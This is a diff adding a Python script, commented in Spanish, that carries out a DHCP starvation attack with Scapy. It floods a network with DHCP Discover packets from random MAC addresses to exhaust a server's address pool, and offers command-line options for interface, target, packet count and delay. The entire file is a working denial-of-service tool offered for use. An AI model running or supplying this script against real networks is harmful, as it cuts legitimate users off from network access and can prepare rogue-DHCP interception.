@@ -1,0 +1,118 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import sys
+# Verificación de la versión de Python
+if sys.version_info[0] < 3:
+    print("[!] Error: Este script requiere Python 3 para ejecutarse.")
+    print(f"    Estás usando Python {sys.version_info[0]}.{sys.version_info[1]}")
+    print("    Por favor, ejecuta el script con 'python3' en lugar de 'python'.")
+    sys.exit(1)
+
+# Ahora es seguro importar las librerías de Python 3
+from scapy.all import *
+import random
+import time
+import signal
+
+# Variable global para controlar la ejecución del bucle
+running = True
+
+def signal_handler(sig, frame):
+    """
+    Manejador de la señal SIGINT (Ctrl+C) para detener el script de forma ordenada.
+    """
+    global running
+    print('\n[!] Deteniendo el ataque... Se ha presionado Ctrl+C.')
+    running = False
+
+def random_mac():
+    """Genera una dirección MAC aleatoria con el byte localmente administrado."""
+    # El primer byte (02) indica que la MAC es localmente administrada y no es de un fabricante real.
+    return "02:%02x:%02x:%02x:%02x:%02x" % (
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff)
+    )
+
+def dhcp_starvation(interface, target_ip, count=1000, delay=0.1):
+    """
+    Realiza un ataque de DHCP starvation enviando peticiones DHCP Discover
+    con direcciones MAC de origen aleatorias para agotar el pool de IPs del servidor.
+    
+    :param interface: Interfaz de red a usar (ej. 'eth0')
+    :param target_ip: IP del servidor DHCP objetivo
+    :param count: Número de peticiones a enviar
+    :param delay: Retardo entre peticiones en segundos
+    """
+    global running
+    
+    print(f"[*] Iniciando ataque DHCP starvation contra {target_ip}")
+    print(f"[*] Enviando {count} peticiones desde la interfaz '{interface}'")
+    print("[*] Presiona Ctrl+C en cualquier momento para detener el script de forma segura.\n")
+    
+    try:
+        # Configurar la interfaz que usará Scapy
+        conf.iface = interface
+        conf.verb = 0 # Desactivar el verbosidad de Scapy
+
+        packets_sent = 0
+        # Bucle que se ejecutará hasta alcanzar el conteo o hasta que 'running' sea False
+        while running and packets_sent < count:
+            mac = random_mac()
+            
+            # Construir el paquete DHCP Discover
+            # Ethernet -> IP -> UDP -> BOOTP -> DHCP
+            dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
+                            IP(src="0.0.0.0", dst="255.255.255.255") / \
+                            UDP(sport=68, dport=67) / \
+                            BOOTP(chaddr=mac, xid=random.randint(1, 0xFFFFFFFF)) / \
+                            DHCP(options=[
+                                ("message-type", "discover"),
+                                ("param_req_list", [1, 3, 6, 15, 119]), # Lista de parámetros solicitados
+                                "end"
+                            ])
+            
+            # Enviar el paquete al nivel 2
+            sendp(dhcp_discover, iface=interface, verbose=0)
+            
+            packets_sent += 1
+            
+            # Mostrar progreso cada 50 paquetes para no saturar la consola
+            if packets_sent % 50 == 0:
+                print(f"[*] Peticiones enviadas: {packets_sent}/{count}")
+            
+            # Esperar antes de enviar el siguiente paquete
+            if running: # Solo dormir si no se ha solicitado la detención
+                time.sleep(delay)
+
+    except KeyboardInterrupt:
+        # Esta excepción no debería ocurrir gracias al manejador de señal,
+        # pero se deja como respaldo.
+        print('\n[!] Ataque detenido por el usuario.')
+        running = False
+    except Exception as e:
+        print(f"\n[!] Ha ocurrido un error: {e}")
+        running = False
+    finally:
+        if packets_sent > 0:
+            print(f"\n[+] Ataque finalizado. Se enviaron un total de {packets_sent} peticiones.")
+        else:
+            print("\n[!] El ataque no se inició o se detuvo antes de enviar paquetes.")
+
+if __name__ == "__main__":
+    # Asociar el manejador de señal a SIGINT (Ctrl+C)
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    parser = argparse.ArgumentParser(description="Script para realizar un ataque DHCP starvation con detención segura.")
+    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red a usar (ej: eth0, wlan0).")
+    parser.add_argument("-t", "--target", required=True, help="IP del servidor DHCP objetivo.")
+    parser.add_argument("-c", "--count", type=int, default=1000, help="Número de peticiones a enviar (default: 1000).")
+    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Retardo entre peticiones en segundos (default: 0.1).")
+    
+    args = parser.parse_args()
+    
+    # Llamar a la función principal con los argumentos proporcionados
+    dhcp_starvation(args.interface, args.target, args.count, args.delay)
